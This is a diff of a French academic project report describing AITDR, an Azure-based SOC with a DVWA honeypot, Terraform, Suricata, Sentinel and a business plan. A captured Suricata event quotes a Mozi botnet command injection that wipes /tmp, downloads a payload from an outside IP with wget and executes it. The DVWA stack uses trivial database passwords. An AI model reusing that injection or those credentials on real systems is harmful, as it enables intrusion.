+\caption{Résultats des indicateurs clés}
+\label{tab:indicateurs}
+\small
+\begin{tabularx}{\textwidth}{|Y|L{3cm}|Y|}
+\hline
+\theadcell{Indicateur} & \theadcell{Résultat} & \theadcell{Analyse} \\
+\hline
+Taux de réponse & 64\% & Participation représentative. \\ \hline
+Insatisfaction outils actuels & 72\% & Forte demande d'alternative. \\ \hline
+Budget sécurité moyen & 120 000 MAD/an & Ressources limitées. \\ \hline
+Intérêt solution Azure-native & 85\% & Bonne adéquation technologique. \\ \hline
+\end{tabularx}
+\end{table}
+
+\subsection{Extraits d'entretiens qualitatifs}
+\begin{itemize}
+  \item \textbf{RSSI, secteur bancaire :} « Microsoft Sentinel nous intéresse, mais nous n'avons pas les compétences internes pour le configurer correctement. »
+  \item \textbf{Analyste SOC :} « Notre SIEM génère trop d'alertes, dont la majorité sont des faux positifs. »
+  \item \textbf{Responsable IT PME :} « Nous avons besoin d'une solution de cybersécurité réaliste par rapport à notre budget. »
+\end{itemize}
+
+\subsection{Décision : GO}
+\begin{table}[H]
+\centering
+\caption{Matrice de décision GO/PIVOT}
+\label{tab:decision}
+\small
+\begin{tabularx}{\textwidth}{|L{3cm}|L{3cm}|L{3cm}|Y|}
+\hline
+\theadcell{Critère} & \theadcell{Seuil requis} & \theadcell{Résultat} & \theadcell{Verdict} \\
+\hline
+Besoin marché & Insatisfaction $>$ 50\% & 72\% & GO \\ \hline
+Faisabilité technique & Prototype déployable & Oui & GO \\ \hline
+Faisabilité budgétaire & $<$ 100 USD & 87,40 USD estimé & GO \\ \hline
+Adéquation marché & Intérêt $>$ 70\% & 85\% & GO \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Cadrage du projet (Project Charter)}
+\begin{table}[H]
+\centering
+\caption{Project Charter complet}
+\label{tab:charter}
+\small
+\begin{tabularx}{\textwidth}{|L{3.4cm}|Y|}
+\hline
+\theadcell{Dimension} & \theadcell{Description} \\
+\hline
+Intitulé & AITDR - Azure Intelligent Threat Detection \& Response \\ \hline
+Équipe & Oussama Gammal, développeur unique. \\ \hline
+Encadrants & [Nom du superviseur] \\ \hline
+Date de démarrage & Octobre 2025 \\ \hline
+Date de livraison & 16 juin 2026 \\ \hline
+Objectif général & Concevoir et déployer une plateforme SOC cloud-native sur Azure. \\ \hline
+Objectifs spécifiques & Infrastructure, honeypot, ETL, SIEM, SOAR, ML, Power BI, budget. \\ \hline
+Périmètre inclus & Azure, Terraform, DVWA, Sentinel, Logic Apps, ML, Power BI. \\ \hline
+Périmètre exclu & Forensique approfondie, multi-cloud, pentest offensif. \\ \hline
+Parties prenantes & Encadrant, EMSI, professionnels interrogés, communautés open source. \\ \hline
+Budget & 100 USD. \\ \hline
+Contraintes & Budget strict, délai académique, dépendance Azure. \\ \hline
+Indicateurs de succès & Déploiement rapide, détection $<$ 5 minutes, réponse $<$ 30 secondes. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Conclusion du Chapitre 1}
+Ce chapitre a établi le contexte, la problématique et l'opportunité du projet AITDR. Il a montré que les organisations marocaines font face à des cybermenaces croissantes avec des moyens limités. Les frustrations des utilisateurs, l'analyse des causes et la validation terrain confirment la pertinence d'une solution SOC cloud-native accessible. Le Project Charter formalise le périmètre, les objectifs et les indicateurs de réussite du projet.
+
+% ============================================
+% CHAPITRE 2
+% ============================================
+\chapter{Analyse Stratégique \& Étude de Marché}
+
+\section{Délimitation et analyse du marché cible}
+\subsection{Définition du marché et périmètre géographique}
+Le marché primaire d'AITDR est celui de la cybersécurité Cloud au Maroc. Le TAM est estimé entre 8 000 et 12 000 entreprises de plus de 10 salariés. Le SAM concerne environ 3 000 entreprises localisées principalement dans la région Casablanca-Settat.
+
+\subsection{Chiffres clés du marché de la cybersécurité au Maroc}
+\begin{table}[H]
+\centering
+\caption{Chiffres clés de la cybersécurité au Maroc}
+\label{tab:marche}
+\small
+\begin{tabularx}{\textwidth}{|Y|L{3cm}|Y|}
+\hline
+\theadcell{Indicateur} & \theadcell{Valeur} & \theadcell{Source} \\
+\hline
+Taille du marché cybersécurité & 1,2 Mrd MAD & ANRT \\ \hline
+CAGR & 18\% & Gartner \\ \hline
+Taille projetée & 2,7 Mrd MAD & Projection \\ \hline
+Entreprises Cloud & 4 500 & ANRT \\ \hline
+Taux de pénétration SIEM & 10\% & Enquête terrain \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Analyse macro-environnementale : PESTEL}
+\placeholderfigure{2.1}{Analyse PESTEL de AITDR}
+\begin{table}[H]
+\centering
+\caption{Analyse PESTEL détaillée}
+\label{tab:pestel}
+\small
+\begin{tabularx}{\textwidth}{|L{2.6cm}|L{2cm}|Y|}
+\hline
+\theadcell{Dimension} & \theadcell{Impact} & \theadcell{Analyse détaillée} \\
+\hline
+Politique & Élevé & Maroc Digital 2030 encourage la transformation numérique et la sécurité des infrastructures. \\ \hline
+Économique & Élevé & Les cyberattaques ont un coût élevé et les PME ont besoin de solutions abordables. \\ \hline
+Social & Élevé & La sensibilisation augmente mais la pénurie de talents cyber demeure forte. \\ \hline
+Technologique & Très élevé & Azure, Sentinel, Logic Apps, Terraform et ML permettent une solution moderne. \\ \hline
+Environnemental & Faible & L'optimisation cloud limite la consommation inutile des ressources. \\ \hline
+Légal & Élevé & La CNDP, la loi 09-08 et les exigences RGPD renforcent le besoin de traçabilité. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Analyse concurrentielle}
+\begin{table}[H]
+\centering
+\caption{Benchmark concurrentiel}
+\label{tab:benchmark}
+\scriptsize
+\begin{tabularx}{\textwidth}{|L{2.3cm}|L{2cm}|L{2.2cm}|L{2.2cm}|Y|Y|}
+\hline
+\theadcell{Concurrent} & \theadcell{Type} & \theadcell{Présence Maroc} & \theadcell{Prix mensuel} & \theadcell{Avantages} & \theadcell{Faiblesses vs AITDR} \\
+\hline
+Microsoft Sentinel & Cloud SIEM & Forte & 20 000+ MAD & Intégration Azure. & Coût et complexité. \\ \hline
+Splunk & SIEM commercial & Partenaires & 80 000+ MAD & Leader historique. & Coût prohibitif. \\ \hline
+Elastic & Open source / Cloud & Communauté & 0 à 15 000+ MAD & Flexibilité. & Expertise requise. \\ \hline
+AITDR & Cloud Azure & Nouvel entrant & 1 200--5 000 MAD & Intégré, économique, reproductible. & Notoriété à construire. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Analyse SWOT de AITDR}
+\begin{table}[H]
+\centering
+\caption{Matrice SWOT}
+\label{tab:swot}
+\small
+\begin{tabularx}{\textwidth}{|Y|Y|}
+\hline
+\theadcell{FORCES} & \theadcell{FAIBLESSES} \\
+\hline
+\begin{itemize}
+\item Architecture Azure native.
+\item Déploiement Terraform.
+\item Intégration SIEM/SOAR/ML/Power BI.
+\item Coût maîtrisé.
+\item Automatisation de la réponse.
+\end{itemize}
+&
+\begin{itemize}
+\item Dépendance Azure.
+\item Notoriété faible.
+\item Développeur unique.
+\item Certifications absentes au départ.
+\end{itemize}
+\\ \hline
+\theadcell{OPPORTUNITÉS} & \theadcell{MENACES} \\
+\hline
+\begin{itemize}
+\item Croissance du cloud.
+\item Besoin PME.
+\item Pénurie de talents.
+\item Adoption de l'IA cyber.
+\end{itemize}
+&
+\begin{itemize}
+\item Concurrence des éditeurs.
+\item Évolution rapide des menaces.
+\item Coûts Azure variables.
+\item Exigences légales.
+\end{itemize}
+\\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Proposition de valeur différenciée}
+\begin{table}[H]
+\centering
+\caption{Proposition de valeur différenciée}
+\label{tab:value}
+\small
+\begin{tabularx}{\textwidth}{|L{3cm}|Y|Y|}
+\hline
+\theadcell{Différenciateur} & \theadcell{Description} & \theadcell{Valeur apportée} \\
+\hline
+Coût maîtrisé & Usage Azure PAYG optimisé. & Accessibilité pour PME. \\ \hline
+Reproductibilité & Déploiement Terraform. & Moins d'erreurs et standardisation. \\ \hline
+SOAR & Logic Apps automatise la réponse. & Réduction du MTTC. \\ \hline
+ML & Isolation Forest et DBSCAN. & Détection d'anomalies inconnues. \\ \hline
+Verticalité & Capture, SIEM, SOAR, ML, visualisation. & Solution complète. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Conclusion du Chapitre 2}
+Ce chapitre a montré que le marché marocain de la cybersécurité cloud est favorable à AITDR. L'analyse PESTEL révèle des facteurs porteurs, notamment la digitalisation, la croissance du cloud et la pénurie de talents cyber. Le benchmark concurrentiel confirme l'existence d'un espace pour une solution plus accessible. La SWOT met en évidence des forces techniques importantes et des risques à surveiller. La proposition de valeur positionne AITDR comme une alternative intégrée et économique.
+
+% ============================================
+% CHAPITRE 3
+% ============================================
+\chapter{Viabilité Entrepreneuriale \& Modèle d'Affaires}
+\section{Business Model Canvas de AITDR}
+\AITDRBusinessModelCanvas
+
+\section{Étude de faisabilité technique}
+\subsection{Ressources matérielles et logicielles}
+\begin{table}[H]
+\centering
+\caption{Ressources matérielles et logicielles}
+\label{tab:ressources}
+\small
+\begin{tabularx}{\textwidth}{|L{3.3cm}|Y|L{2.5cm}|Y|}
+\hline
+\theadcell{Ressource} & \theadcell{Détail} & \theadcell{Coût estimé} & \theadcell{Justification} \\
+\hline
+Azure & VMs, Sentinel, SQL, Logic Apps. & 100 USD max & Crédits étudiants. \\ \hline
+Terraform & IaC. & 0 USD & Open source. \\ \hline
+Suricata & IDS/IPS. & 0 USD & Open source. \\ \hline
+Python & ETL et ML. & 0 USD & Open source. \\ \hline
+Power BI & Visualisation. & 0 USD & Desktop gratuit. \\ \hline
+GitHub & Versioning. & 0 USD & Dépôt projet. \\ \hline
+\end{tabularx}
+\end{table}
+
+\subsection{Ressources humaines et coût de développement}
+\begin{table}[H]
+\centering
+\caption{Coût de développement}
+\label{tab:coutdev}
+\small
+\begin{tabularx}{\textwidth}{|L{3cm}|Y|C{1.5cm}|L{2cm}|R{2.5cm}|}
+\hline
+\theadcell{Profil/Poste} & \theadcell{Rôle} & \theadcell{Nb} & \theadcell{Durée} & \theadcell{Coût estimé} \\
+\hline
+Chef de projet & Planification et reporting. & 1 & PFA & 3 000 MAD \\ \hline
+Cloud Architect & Architecture Azure et Terraform. & 1 & PFA & 2 500 MAD \\ \hline
+Développeur SIEM/SOAR & Sentinel, KQL, Logic Apps. & 1 & PFA & 2 000 MAD \\ \hline
+Data Scientist & ML et analyse. & 1 & PFA & 1 500 MAD \\ \hline
+Total & Conditions PFA. & -- & -- & 9 000 MAD \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Étude de faisabilité commerciale}
+\subsection{Modèle de tarification}
+\begin{table}[H]
+\centering
+\caption{Grille tarifaire}
+\label{tab:tarifs}
+\small
+\begin{tabularx}{\textwidth}{|L{2.3cm}|L{2.3cm}|Y|Y|}
+\hline
+\theadcell{Offre} & \theadcell{Prix} & \theadcell{Fonctionnalités} & \theadcell{Cible} \\
+\hline
+Discovery & Gratuit & Open source auto-hébergé. & Étudiants, chercheurs. \\ \hline
+Basic & 49 USD/mois & Honeypot, Sentinel, KQL. & Startups. \\ \hline
+Premium & 99 USD/mois & Basic + SOAR + ML + Power BI. & PME. \\ \hline
+Enterprise & Sur devis & Infrastructure dédiée et support. & Grands comptes, MSSP. \\ \hline
+\end{tabularx}
+\end{table}
+
+\subsection{Projection du chiffre d'affaires --- Année 1}
+\begin{table}[H]
+\centering
+\caption{Projection du chiffre d'affaires}
+\label{tab:ca}
+\small
+\begin{tabularx}{\textwidth}{|L{1.5cm}|Y|R{2.1cm}|R{2.1cm}|R{2.2cm}|}
+\hline
+\theadcell{Période} & \theadcell{Levier d'acquisition} & \theadcell{Clients Discovery} & \theadcell{Clients Payants} & \theadcell{CA mensuel} \\
+\hline
+M1 & Lancement GitHub. & 50 & 0 & 0 USD \\ \hline
+M2 & LinkedIn et bouche-à-oreille. & 80 & 2 & 148 USD \\ \hline
+M3 & Blog et webinaires. & 120 & 5 & 395 USD \\ \hline
+M4 & Partenariats écoles. & 180 & 8 & 692 USD \\ \hline
+M5 & Azure Marketplace. & 250 & 15 & 1 335 USD \\ \hline
+M6 & Campagne marketing. & 350 & 25 & 2 275 USD \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Étude de faisabilité financière}
+\subsection{Structure des coûts opérationnels}
+\begin{table}[H]
+\centering
+\caption{Structure des coûts opérationnels}
+\label{tab:coutops}
+\small
+\begin{tabularx}{\textwidth}{|Y|L{2cm}|R{3cm}|Y|}
+\hline
+\theadcell{Poste de coût} & \theadcell{Type} & \theadcell{Montant mensuel} & \theadcell{Base de calcul} \\
+\hline
+Infrastructure Azure & Variable & 44 USD/client & VMs, SQL, Sentinel. \\ \hline
+Support technique & Fixe & 100 USD & Support partiel. \\ \hline
+Maintenance & Fixe & 80 USD & Correctifs et règles. \\ \hline
+Marketing & Fixe & 70 USD & Contenu et acquisition. \\ \hline
+Documentation & Fixe & 20 USD & Hébergement et rédaction. \\ \hline
+\end{tabularx}
+\end{table}
+
+\subsection{Calcul du seuil de rentabilité}
+\begin{table}[H]
+\centering
+\caption{Calcul du seuil de rentabilité}
+\label{tab:sr}
+\small
+\begin{tabularx}{\textwidth}{|L{4cm}|L{3cm}|Y|}
+\hline
+\theadcell{Paramètre} & \theadcell{Valeur} & \theadcell{Détail} \\
+\hline
+RMA & 888 USD & 74 USD/mois moyen $\times$ 12. \\ \hline
+CF & 3 240 USD & Charges fixes annuelles. \\ \hline
+CVu & 528 USD & Coût infra annuel par client. \\ \hline
+MCVu & 360 USD & RMA - CVu. \\ \hline
+SR & 9 clients & CF / MCVu. \\ \hline
+CA SR & 7 992 USD & SR $\times$ RMA. \\ \hline
+Interprétation & Rentable dès 9 clients & Seuil réaliste pour un MVP. \\ \hline
+\end{tabularx}
+\end{table}
+
+\subsection{Projections financières sur deux semestres}
+\begin{table}[H]
+\centering
+\caption{Projections financières}
+\label{tab:projections}
+\small
+\begin{tabularx}{\textwidth}{|Y|R{3cm}|R{3cm}|}
+\hline
+\theadcell{Indicateur} & \theadcell{S1} & \theadcell{S2} \\
+\hline
+Clients payants & 25 & 50 \\ \hline
+CA semestriel & 4 845 USD & 10 000 USD \\ \hline
+Charges fixes & 1 620 USD & 1 800 USD \\ \hline
+Charges variables & 2 640 USD & 5 280 USD \\ \hline
+Résultat & 585 USD & 2 920 USD \\ \hline
+Marge nette & 12\% & 29\% \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Stratégie marketing et plan de lancement}
+La stratégie marketing repose sur une approche progressive : publication du prototype open source, diffusion de contenus techniques, démonstrations auprès d'écoles d'ingénieurs, communication LinkedIn, webinaires et inscription sur Azure Marketplace. Le lancement vise d'abord les étudiants, chercheurs et petites structures, puis les PME et MSSP intéressés par un SOC accessible.
+
+\section{Scalabilité et roadmap produit}
+\begin{table}[H]
+\centering
+\caption{Roadmap produit}
+\label{tab:roadmap}
+\small
+\begin{tabularx}{\textwidth}{|L{2cm}|L{3cm}|Y|}
+\hline
+\theadcell{Horizon} & \theadcell{Période} & \theadcell{Objectifs et fonctionnalités/actions clés} \\
+\hline
+H1 & Mois 1-3 & MVP : Terraform, DVWA, ETL, Sentinel et règles KQL. \\ \hline
+H2 & Mois 4-6 & SOAR, ML, Power BI, documentation et marketplace. \\ \hline
+H3 & Mois 7-12 & Threat Intelligence, Sigma, Zeek, multi-régions et API REST. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Conclusion du Chapitre 3}
+Ce chapitre a démontré la viabilité entrepreneuriale d'AITDR. Le BMC structure clairement le modèle d'affaires, les ressources techniques sont accessibles et les coûts restent compatibles avec un contexte PFA. Les projections commerciales montrent un potentiel de monétisation réaliste. L'analyse financière indique un seuil de rentabilité atteignable. La roadmap propose une évolution progressive vers une solution plus scalable.
+
+% ============================================
+% CHAPITRE 4
+% ============================================
+\chapter{Planification \& Management de Projet}
+\section{Choix de la méthodologie de développement}
+\begin{table}[H]
+\centering
+\caption{Comparaison des méthodologies}
+\label{tab:methodo}
+\scriptsize
+\begin{tabularx}{\textwidth}{|Y|Y|Y|Y|}
+\hline
+\theadcell{Critère} & \theadcell{Cycle en cascade} & \theadcell{Méthode Agile/Scrum} & \theadcell{Méthode hybride} \\
+\hline
+Clarté des besoins & Forte au départ. & Adaptée aux besoins évolutifs. & Moyenne. \\ \hline
+Réactivité & Faible. & Très élevée. & Élevée. \\ \hline
+Taille de l'équipe & Grande équipe. & Petite équipe. & Variable. \\ \hline
+Livraisons & Une livraison finale. & Livraisons incrémentales. & Par jalons. \\ \hline
+Gestion du risque & Risque tardif. & Risque maîtrisé progressivement. & Risque modéré. \\ \hline
+Contexte académique & Adapté mais rigide. & Très adapté. & Adapté. \\ \hline
+\end{tabularx}
+\end{table}
+Le choix retenu est Scrum, car il permet une progression incrémentale, une adaptation continue et une meilleure maîtrise des risques dans un projet réalisé par un développeur unique.
+
+\section{Structure de l'équipe et rôles}
+\begin{table}[H]
+\centering
+\caption{Structure de l'équipe et rôles}
+\label{tab:equipe}
+\small
+\begin{tabularx}{\textwidth}{|L{3.5cm}|Y|}
+\hline
+\theadcell{Rôle} & \theadcell{Responsabilités} \\
+\hline
+Chef de projet & Planification, coordination, reporting, gestion des risques. \\ \hline
+Cloud Architect & Architecture Azure, Terraform, VNet, NSG, Key Vault. \\ \hline
+Développeur SIEM/SOAR & Microsoft Sentinel, KQL, Logic Apps, automatisation. \\ \hline
+Data Scientist & Modèles ML, analyse de logs, Isolation Forest, DBSCAN. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Planning prévisionnel (Diagramme de Gantt)}
+\placeholderfigure{4.1}{Diagramme de Gantt du projet AITDR}
+\begin{itemize}
+  \item \textbf{Phase 1 : Cadrage et conception (Octobre - Novembre 2025)} : besoin, marché, architecture.
+  \item \textbf{Phase 2 : Infrastructure et collecte (Décembre 2025 - Janvier 2026)} : Terraform, DVWA, Suricata, collecte.
+  \item \textbf{Phase 3 : SIEM et SOAR (Février - Mars 2026)} : Sentinel, KQL, Logic Apps.
+  \item \textbf{Phase 4 : ML et Visualisation (Avril - Mai 2026)} : Isolation Forest, DBSCAN, Power BI.
+  \item \textbf{Phase 5 : Tests et documentation (Juin 2026)} : validation finale, rapport et soutenance.
+\end{itemize}
+
+\section{Gestion des risques}
+\begin{table}[H]
+\centering
+\caption{Matrice des risques}
+\label{tab:risques}
+\small
+\begin{tabularx}{\textwidth}{|L{1cm}|Y|L{2cm}|L{2cm}|Y|}
+\hline
+\theadcell{ID} & \theadcell{Risque} & \theadcell{Probabilité} & \theadcell{Impact} & \theadcell{Mitigation} \\
+\hline
+R1 & Dépassement budget Azure. & Moyenne & Élevé & Auto-shutdown et suivi Cost Management. \\ \hline
+R2 & Intégration SIEM/SOAR difficile. & Élevée & Élevé & Tests unitaires et validation progressive. \\ \hline
+R3 & Données d'attaques insuffisantes. & Faible & Élevé & Déploiement précoce du honeypot. \\ \hline
+R4 & Temps limité pour ML. & Élevée & Moyen & Priorisation de modèles simples. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Conclusion du Chapitre 4}
+Ce chapitre a présenté l'organisation du projet, le choix méthodologique et la gestion des risques. Scrum est retenu pour sa flexibilité et son adéquation à un projet académique évolutif. Les rôles couvrent l'ensemble des compétences nécessaires. Le planning en cinq phases structure le déroulement du projet. Les risques identifiés disposent de mesures de mitigation concrètes.
+
+% ============================================
+% CHAPITRE 5
+% ============================================
+\chapter{Conception et modélisation de la solution proposée}
+\section{Architecture globale}
+L'architecture globale repose sur une topologie Hub-and-Spoke comprenant quatre zones : Hub (10.10.0.0/24) pour l'administration, VNet1 - DMZ (10.10.1.0/24) pour le honeypot exposé, VNet2 - Data (10.10.2.0/24) pour le stockage et VNet3 - SIEM/SOAR (10.10.3.0/24) pour l'analyse et l'orchestration.
+\placeholderfigure{5.1}{Architecture globale AITDR --- topologie Hub-and-Spoke Azure}
+
+\section{Topologie réseau détaillée}
+\subsection{Zone Hub --- 10.10.0.0/24}
+La zone Hub centralise l'administration et héberge le VPN Gateway. Elle permet l'accès sécurisé aux ressources internes et sert de point de contrôle pour les flux d'administration.
+\placeholderfigure{5.2}{Vue détaillée de la zone Hub}
+
+\subsection{Zone VNet1 --- DMZ (10.10.1.0/24)}
+La zone DMZ héberge VM1, le honeypot DVWA exposé via l'IP publique 20.199.184.20. Les ports 80 et 443 sont ouverts pour attirer les attaques web, tandis que le port 22 est restreint à l'administrateur.
+\placeholderfigure{5.3}{Vue détaillée de la zone DMZ}
+
+\subsection{Zone VNet2 --- Data (10.10.2.0/24)}
+La zone Data héberge Azure SQL Database et Azure Blob Storage. Elle ne possède pas d'IP publique et reçoit les données issues de la collecte et du parsing.
+\placeholderfigure{5.4}{Vue détaillée de la zone Data}
+
+\subsection{Zone VNet3 --- SIEM/SOAR (10.10.3.0/24)}
+La zone SIEM/SOAR héberge Microsoft Sentinel, Azure Logic Apps et VM2 pour le Machine Learning. Elle est isolée de la DMZ afin de limiter les mouvements latéraux.
+\placeholderfigure{5.5}{Vue détaillée de la zone SIEM/SOAR}
+
+\section{Matrice des flux réseau autorisés}
+\begin{table}[H]
+\centering
+\caption{Matrice des flux réseau autorisés}
+\label{tab:flux}
+\small
+\begin{tabularx}{\textwidth}{|L{3cm}|L{3.2cm}|L{2cm}|Y|}
+\hline
+\theadcell{Source} & \theadcell{Destination} & \theadcell{Ports} & \theadcell{Justification} \\
+\hline
+Internet & VNet1 DMZ & 80,443 & Exposition DVWA. \\ \hline
+Admin IP & VNet1 DMZ & 22 & Administration SSH. \\ \hline
+VNet1 DMZ & VNet2 SQL & 1433 & Insertion des logs. \\ \hline
+VNet1 DMZ & Blob Storage & 443 & Upload des rapports. \\ \hline
+VNet2 Data & VNet3 ML & Interne & Lecture des données. \\ \hline
+VNet3 SOAR & Azure API & 443 & Blocage NSG. \\ \hline
+Hub VPN & Tous VNets & All & Administration sécurisée. \\ \hline
+Deny-All & Tous & All & Blocage par défaut. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Modèle de sécurité Zero Trust}
+Le modèle Zero Trust repose sur cinq couches : \textbf{Identité} avec Managed Identity, \textbf{Autorisation} par RBAC minimal, \textbf{Chiffrement} via TLS, SSH et VPN, \textbf{Segmentation} par NSG et règles Deny-All, et \textbf{Secrets} centralisés dans Azure Key Vault.
+
+\section{Flux de données de bout en bout}
+\begin{enumerate}
+  \item L'attaquant contacte VM1.
+  \item Suricata analyse les paquets.
+  \item Apache et SSH génèrent des logs.
+  \item Le timer systemd déclenche la collecte.
+  \item Les logs sont copiés depuis DVWA.
+  \item Les rapports sont envoyés vers Blob Storage.
+  \item Les scripts Python parsèrent les logs.
+  \item Les données sont insérées dans Azure SQL.
+  \item Azure Monitor remonte les syslogs.
+  \item Sentinel exécute les règles KQL.
+  \item Les incidents déclenchent Logic Apps.
+  \item Logic Apps bloque les IP malveillantes.
+  \item VM2 exécute les modèles ML et Power BI visualise les résultats.
+\end{enumerate}
+
+\section{Conclusion du Chapitre 5}
+Ce chapitre a présenté l'architecture et la modélisation d'AITDR. La topologie Hub-and-Spoke permet une séparation claire des zones d'administration, d'exposition, de données et d'analyse. La matrice des flux garantit le principe du moindre privilège. Le modèle Zero Trust renforce la sécurité. Le flux de bout en bout montre la cohérence entre capture, analyse, réponse et visualisation.
+
+% ============================================
+% CHAPITRE 6
+% ============================================
+\chapter{Réalisation de la solution AITDR}
+\section{Infrastructure Cloud Azure (Terraform IaC)}
+\subsection{Choix de l'Infrastructure as Code}
+Terraform est retenu pour sa reproductibilité, sa lisibilité HCL et sa gestion d'état. Il permet de versionner l'infrastructure et de déployer les ressources Azure de façon contrôlée.
+
+\subsection{Structure modulaire}
+\begin{lstlisting}[style=bashstyle, caption={Arborescence complète des modules Terraform}]
+soc-lab/
+|-- main.tf
+|-- variables.tf
+|-- outputs.tf
+`-- modules/
+    |-- key_vault/
+    |-- vm1_webserver/
+    |-- vm2_ml/
+    |-- sql_database/
+    |-- sentinel/
+    |-- soar/
+    |-- nsg/
+    |-- vnet1/
+    |-- vnet2/
+    |-- vnet3/
+    `-- hub_vnet/
+\end{lstlisting}
+\placeholderfigure{6.1}{Structure modulaire du projet Terraform}
+
+\subsection{Extrait du Module Key Vault}
+\begin{lstlisting}[style=hclstyle, caption={Module Key Vault}]
+resource "azurerm_key_vault" "aitdr_kv" {
+  name                       = "aitdr-kv-${random_string.suffix.result}"
+  location                   = var.location
+  resource_group_name        = var.resource_group_name
+  tenant_id                  = var.tenant_id
+  sku_name                   = "standard"
+  soft_delete_retention_days = 7
+  purge_protection_enabled   = true
+  enable_rbac_authorization  = true
+}
+\end{lstlisting}
+
+\subsection{Extrait du Module VM1 WebServer}
+\begin{lstlisting}[style=hclstyle, caption={Module VM1 WebServer}]
+resource "azurerm_linux_virtual_machine" "vm1_webserver" {
+  name                            = "VM1-WebServer"
+  location                        = var.location
+  resource_group_name             = var.resource_group_name
+  size                            = "Standard_B2s"
+  admin_username                  = "adminuser"
+  disable_password_authentication = true
+
+  admin_ssh_key {
+    username   = "adminuser"
+    public_key = var.ssh_public_key
+  }
+
+  network_interface_ids = [azurerm_network_interface.vm1_nic.id]
+}
+\end{lstlisting}
+
+\subsection{Configuration NSG}
+\begin{lstlisting}[style=hclstyle, caption={Configuration NSG-DMZ}]
+resource "azurerm_network_security_group" "nsg_dmz" {
+  name                = "NSG-DMZ"
+  location            = var.location
+  resource_group_name = var.resource_group_name
+
+  security_rule {
+    name                       = "Allow-HTTP"
+    priority                   = 110
+    direction                  = "Inbound"
+    access                     = "Allow"
+    protocol                   = "Tcp"
+    source_port_range          = "*"
+    destination_port_range     = "80"
+    source_address_prefix      = "*"
+    destination_address_prefix = "*"
+  }
+
+  security_rule {
+    name                       = "Allow-SSH"
+    priority                   = 130
+    direction                  = "Inbound"
+    access                     = "Allow"
+    protocol                   = "Tcp"
+    source_port_range          = "*"
+    destination_port_range     = "22"
+    source_address_prefix      = "${var.admin_ip}/32"
+    destination_address_prefix = "*"
+  }
+
+  security_rule {
+    name                       = "Deny-All"
+    priority                   = 4096
+    direction                  = "Inbound"
+    access                     = "Deny"
+    protocol                   = "*"
+    source_port_range          = "*"
+    destination_port_range     = "*"
+    source_address_prefix      = "*"
+    destination_address_prefix = "*"
+  }
+}
+\end{lstlisting}
+\placeholderfigure{6.2}{Configuration NSG-DMZ dans le portail Azure}
+
+\subsection{Ordre de déploiement}
+\begin{enumerate}
+  \item Initialiser Terraform avec \code{terraform init}.
+  \item Déployer les ressources réseau et NSG.
+  \item Déployer Key Vault et SQL Database.
+  \item Déployer VM1, VM2, Sentinel et Logic Apps.
+  \item Exécuter \code{terraform apply} pour le déploiement global.
+\end{enumerate}
+
+\section{Honeypot et Capture des Attaques}
+\subsection{Justification du choix DVWA}
+DVWA est choisi car il couvre plusieurs vulnérabilités OWASP Top 10, attire naturellement les scans automatisés et se déploie facilement via Docker. Il constitue un honeypot pédagogique adapté à un environnement PFA.
+
+\subsection{Architecture Docker}
+\begin{lstlisting}[style=bashstyle, caption={docker-compose.yml complet}]
+services:
+  dvwa:
+    image: vulnerables/web-dvwa
+    ports:
+      - "80:80"
+    restart: always
+    depends_on:
+      - mysql
+    networks:
+      - aitdr_net
+
+  mysql:
+    image: mysql:5.7
+    environment:
+      MYSQL_ROOT_PASSWORD: dvwa
+      MYSQL_DATABASE: dvwa
+      MYSQL_USER: dvwa
+      MYSQL_PASSWORD: dvwa
+    restart: always
+    volumes:
+      - mysql_data:/var/lib/mysql
+    networks:
+      - aitdr_net
+
+volumes:
+  mysql_data:
+
+networks:
+  aitdr_net:
+    driver: bridge
+\end{lstlisting}
+\placeholderfigure{6.3}{Docker Compose --- Stack DVWA}
+
+\subsection{Cycle de vie du bootstrap}
+\begin{table}[H]
+\centering
+\caption{Cycle de vie du bootstrap}
+\label{tab:bootstrap}
+\small
+\begin{tabularx}{\textwidth}{|L{2.5cm}|L{4cm}|Y|}
+\hline
+\theadcell{Couche} & \theadcell{Mécanisme} & \theadcell{Responsabilité} \\
+\hline
+Layer 1 & bootstrap.sh / cloud-init & Installation packages, Docker, Suricata, durcissement SSH. \\ \hline
+Layer 2 & aitdr-init.sh & Secrets Key Vault, .env, docker-compose up. \\ \hline
+Layer 3 & Timers systemd & Collecte, parsing et upload périodiques. \\ \hline
+\end{tabularx}
+\end{table}
+
+\subsection{Suricata IDS/IPS}
+\begin{lstlisting}[style=bashstyle, caption={Configuration YAML Suricata}]
+vars:
+  address-groups:
+    HOME_NET: "[10.0.0.0/8,172.16.0.0/12,192.168.0.0/16]"
+    EXTERNAL_NET: "any"
+
+af-packet:
+  - interface: eth0
+    cluster-id: 99
+    cluster-type: cluster_flow
+    defrag: yes
+    use-mmap: yes
+
+outputs:
+  - eve-log:
+      enabled: yes
+      filetype: regular
+      filename: /var/log/suricata/eve.json
+      types:
+        - alert
+        - http
+        - dns
+        - tls
+        - flow
+\end{lstlisting}
+
+\subsection{Exemple d'événement EVE JSON capturé}
+\begin{lstlisting}[style=bashstyle, caption={Événement EVE JSON --- Mozi Botnet}]
+{
+  "timestamp": "2026-03-15T14:23:01.456789+0000",
+  "event_type": "http",
+  "src_ip": "67.102.7.124",
+  "src_port": 54321,
+  "dest_ip": "20.199.184.20",
+  "dest_port": 80,
+  "proto": "TCP",
+  "http": {
+    "hostname": "20.199.184.20",
+    "url": "/setup.cgi?cmd=rm+-rf+/tmp/*;wget+http://45.95.55.31/Mozi.m+-O+/tmp/m;sh+m",
+    "http_method": "GET",
+    "http_user_agent": "Go-http-client/1.1",
+    "status": 404,
+    "length": 0
+  }
+}
+\end{lstlisting}
+\placeholderfigure{6.4}{Événement EVE JSON --- Mozi Botnet}
+
+\section{Pipeline de Collecte et Traitement}
+\subsection{Architecture du pipeline}
